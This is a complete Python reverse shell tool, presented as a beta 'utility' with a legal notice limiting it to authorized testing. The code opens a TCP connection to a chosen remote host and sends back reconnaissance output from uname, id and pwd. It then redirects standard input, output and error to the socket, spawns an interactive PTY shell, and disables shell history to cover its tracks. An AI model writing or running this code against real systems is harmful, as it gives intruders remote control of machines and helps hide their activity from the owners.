#!/usr/bin/env python3
"""
Reverse Shell Utility .. beta .. 
Copyright (C) 2026

IMPORTANT LEGAL NOTICE:
This tool is provided for AUTHORIZED SECURITY TESTING ONLY.
Users must have explicit written permission before using this tool.
Unauthorized use may violate computer fraud and abuse laws.
Users take full responsibility for any actions performed using this tool.

This program is distributed under the GPL v2 license.
"""

import argparse
import os
import pty
import socket
import subprocess
import sys
from pathlib import Path
from typing import Optional


class ReverseShell:
    """Establishes a reverse shell connection to a remote host."""

    def __init__(
        self, host: str, port: int, shell: str = "/bin/bash", timeout: int = 30
    ):
        self.host = host
        self.port = port
        self.shell = shell
        self.timeout = timeout
        self.sock: Optional[socket.socket] = None

    def connect(self) -> bool:
        """Establish TCP connection to the remote host."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(self.timeout)
            self.sock.connect((self.host, self.port))
            print(
                f"[+] Connected to {self.host}:{self.port}", file=sys.stderr
            )
            return True
        except socket.error as e:
            print(f"[-] Connection failed: {e}", file=sys.stderr)
            return False

    def spawn_shell(self) -> None:
        """Spawn an interactive shell over the connection."""
        if not self.sock:
            raise RuntimeError("Not connected")

        # Send initial system information
        try:
            info = subprocess.check_output(
                "uname -a; id; pwd", shell=True, stderr=subprocess.STDOUT
            )
            self.sock.sendall(info)
        except subprocess.CalledProcessError:
            pass

        # Spawn PTY for interactive shell
        os.dup2(self.sock.fileno(), 0)  # stdin
        os.dup2(self.sock.fileno(), 1)  # stdout
        os.dup2(self.sock.fileno(), 2)  # stderr

        # Clear history
        os.environ["HISTFILE"] = "/dev/null"

        # Execute shell
        pty.spawn(self.shell)

    def cleanup(self) -> None:
        """Close the socket connection."""
        if self.sock:
            self.sock.close()


def validate_port(port: int) -> bool:
    """Validate port number is in valid range."""
    return 1 <= port <= 65535


def main() -> int:
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Reverse shell utility for authorized testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="WARNING: Only use with explicit authorization!",
    )
    parser.add_argument(
        "-H", "--host", required=True, help="Target host IP address"
    )
    parser.add_argument(
        "-p", "--port", type=int, required=True, help="Target port number"
    )
    parser.add_argument(
        "-s",
        "--shell",
        default="/bin/bash",
        help="Shell to spawn (default: /bin/bash)",
    )
    parser.add_argument(
        "-t",
        "--timeout",
        type=int,
        default=30,
        help="Connection timeout in seconds (default: 30)",
    )

    args = parser.parse_args()

    # Validate inputs
    if not validate_port(args.port):
        print("[-] Invalid port number", file=sys.stderr)
        return 1

    if not Path(args.shell).exists():
        print(f"[-] Shell not found: {args.shell}", file=sys.stderr)
        return 1

    # Create and execute reverse shell
    shell = ReverseShell(args.host, args.port, args.shell, args.timeout)

    try:
        if not shell.connect():
            return 1
        shell.spawn_shell()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user", file=sys.stderr)
    except Exception as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        return 1
    finally:
        shell.cleanup()

    return 0


if __name__ == "__main__":
    sys.exit(main())
